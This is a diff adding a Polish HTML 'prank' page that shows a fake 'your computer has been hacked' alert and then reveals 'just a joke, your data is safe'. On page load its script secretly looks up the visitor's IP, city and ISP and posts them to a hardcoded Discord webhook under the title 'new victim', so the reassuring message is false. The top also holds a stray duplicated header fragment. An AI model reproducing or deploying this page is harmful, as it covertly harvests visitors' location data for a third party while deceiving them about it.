@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ALERT - Krytyczny błąd bezpieczeństwa</title>
+
+pizda.html
+8 KB
+﻿
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ALERT - Krytyczny błąd bezpieczeństwa</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: #000;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            overflow-x: hidden;
+            cursor: none;
+        }
+
+        .cursor {
+            width: 20px; height: 20px;
+            border: 2px solid #00ff41;
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            box-shadow: 0 0 10px #00ff41;
+        }
+
+        #matrix {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            opacity: 0.07;
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .alert-box {
+            border: 2px solid #ff0000;
+            background: rgba(0,0,0,0.95);
+            max-width: 750px;
+            width: 100%;
+            padding: 0;
+            box-shadow: 0 0 40px rgba(255,0,0,0.5);
+            animation: borderPulse 1s infinite;
+        }
+
+        @keyframes borderPulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(255,0,0,0.5); }
+            50% { box-shadow: 0 0 80px rgba(255,0,0,0.9); }
+        }
+
+        .alert-header { background: #ff0000; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; color: #000; font-family: 'Orbitron'; font-weight: 900; }
+        .alert-body { padding: 30px; }
+        .skull { text-align: center; font-size: 60px; margin-bottom: 15px; }
+        h1 { font-family: 'Orbitron'; font-size: 22px; color: #ff0000; text-align: center; letter-spacing: 4px; }
+        
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
+        .info-card { background: rgba(255,0,0,0.05); border: 1px solid #ff000044; padding: 12px; }
+        .label { color: #ff6666; font-size: 9px; letter-spacing: 2px; }
+        .value { color: #00ff41; font-size: 13px; }
+
+        .progress-bar { height: 8px; background: #1a0000; border: 1px solid #ff000044; overflow: hidden; margin-bottom: 10px; }
+        .progress-fill { height: 100%; background: #ff0000; width: 0%; transition: width 0.3s; }
+        .btn-panic { width: 100%; padding: 18px; background: #ff0000; border: none; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; }
+
+        #reveal-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body>
+
+<div class="cursor" id="cursor"></div>
+<canvas id="matrix"></canvas>
+
+<div class="container">
+    <div class="alert-box">
+        <div class="alert-header">⚠ KRYTYCZNY ALERT BEZPIECZEŃSTWA ⚠</div>
+        <div class="alert-body">
+            <div class="skull">💀</div>
+            <h1>TWÓJ KOMPUTER ZOSTAŁ PRZEJĘTY</h1>
+            <div class="info-grid">
+                <div class="info-card"><div class="label">IP</div><div id="ip-display" class="value">SKANOWANIE...</div></div>
+                <div class="info-card"><div class="label">MIASTO</div><div id="loc-display" class="value">USTALANIE...</div></div>
+                <div class="info-card"><div class="label">SYSTEM</div><div id="os-display" class="value">...</div></div>
+                <div class="info-card"><div class="label">STATUS</div><div class="value" style="color:red">ZAINFEKOWANY</div></div>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="p1"></div></div>
+            <div id="log-box" style="font-size: 10px; color: #00ff41; height: 40px; margin-bottom: 20px;"></div>
+            <button class="btn-panic" onclick="showReveal()">STOP HACK</button>
+        </div>
+    </div>
+</div>
+
+<div id="reveal-screen">
+    <h1 style="color:#00ff41; font-size: 40px;">HAHA ŻART! 😂</h1>
+    <p>Twoje dane są bezpieczne.</p>
+</div>
+
+<script>
+    // Matrix effect
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const drops = Array(Math.floor(canvas.width/20)).fill(1);
+    function draw() {
+        ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = '#00ff41'; ctx.font = '15px monospace';
+        drops.forEach((y, i) => {
+            ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
+            if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(draw, 50);
+
+    // Cursor
+    document.addEventListener('mousemove', e => {
+        const c = document.getElementById('cursor');
+        c.style.left = e.clientX - 10 + 'px';
+        c.style.top = e.clientY - 10 + 'px';
+    });
+
+    // POBIERANIE IP I WYSYŁKA NA DISCORD
+    const DISCORD_URL = 'https://discordapp.com/api/webhooks/1479604054144323776/jTaf2b7izpoRE2wzqnlx3imiYGKPI5mtK1XFiPYzvR01RrOwqGsvrexuA00w6zigWDLL';
+
+    fetch('http://ip-api.com/json/')
+    .then(res => res.json())
+    .then(data => {
+        const ip = data.query || "Błąd";
+        const city = data.city || "Nieznane";
+        const isp = data.isp || "Nieznany";
+
+        // Wyświetlanie na stronie
+        document.getElementById('ip-display').textContent = ip;
+        document.getElementById('loc-display').textContent = city;
+        document.getElementById('os-display').textContent = navigator.platform;
+
+        // Wysyłanie na Discord
+        fetch(DISCORD_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🚀 NOWA OFIARA",
+                    color: 16711680,
+                    fields: [
+                        {name: "IP", value: ip, inline: true},
+                        {name: "MIASTO", value: city, inline: true},
+                        {name: "ISP", value: isp, inline: false}
+                    ]
+                }]
+            })
+        });
+    }).catch(err => {
+        document.getElementById('ip-display').textContent = "Błąd API";
+    });
+
+    // Progress bar animation
+    let p = 0;
+    setInterval(() => { if(p < 100) { p++; document.getElementById('p1').style.width = p + '%'; } }, 100);
+
+    function showReveal() { document.getElementById('reveal-screen').style.display = 'flex'; }
+</script>
+</body>
+</html>
